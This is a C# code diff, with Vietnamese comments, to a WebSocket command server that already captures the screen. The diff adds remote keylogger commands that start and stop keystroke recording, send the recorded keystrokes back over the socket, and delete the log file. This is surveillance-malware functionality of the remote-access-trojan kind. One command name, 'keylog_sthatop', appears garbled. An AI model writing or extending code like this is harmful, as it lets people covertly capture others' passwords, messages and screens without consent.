@@ -117,6 +117,24 @@ namespace WebSocketTest
                         // 2. Trả về JSON chứa dữ liệu ảnh
                         // Lưu ý: Dữ liệu ảnh rất dài, nên gửi dạng JSON đặc biệt
                         return $"{{\"type\": \"screen_capture\", \"data\": \"{base64Image}\"}}";
+                    // --- KEYLOGGER COMMANDS ---
+                    case "keylog_start":
+                        KeyLoggerService.Start();
+                        return JsonSuccess("Đã bắt đầu ghi phím (Keylogger Started).");
+
+                    case "keylog_sthatop":
+                        KeyLoggerService.Stop();
+                        return JsonSuccess("Đã dừng ghi phím.");
+
+                    case "keylog_get":
+                        string logs = KeyLoggerService.GetLogs();
+                        // Cần encode JSON cẩn thận vì log có thể chứa ký tự xuống dòng
+                        string safeLogs = logs.Replace("\r", "").Replace("\n", "\\n").Replace("\"", "\\\"");
+                        return $"{{\"type\": \"keylog_data\", \"data\": \"{safeLogs}\"}}";
+                    
+                    case "keylog_clear":
+                        KeyLoggerService.ClearLogs();
+                        return JsonSuccess("Đã xóa file log.");
                 }
             }
             catch (Exception ex) { return JsonError("Lỗi Server: " + ex.Message); }
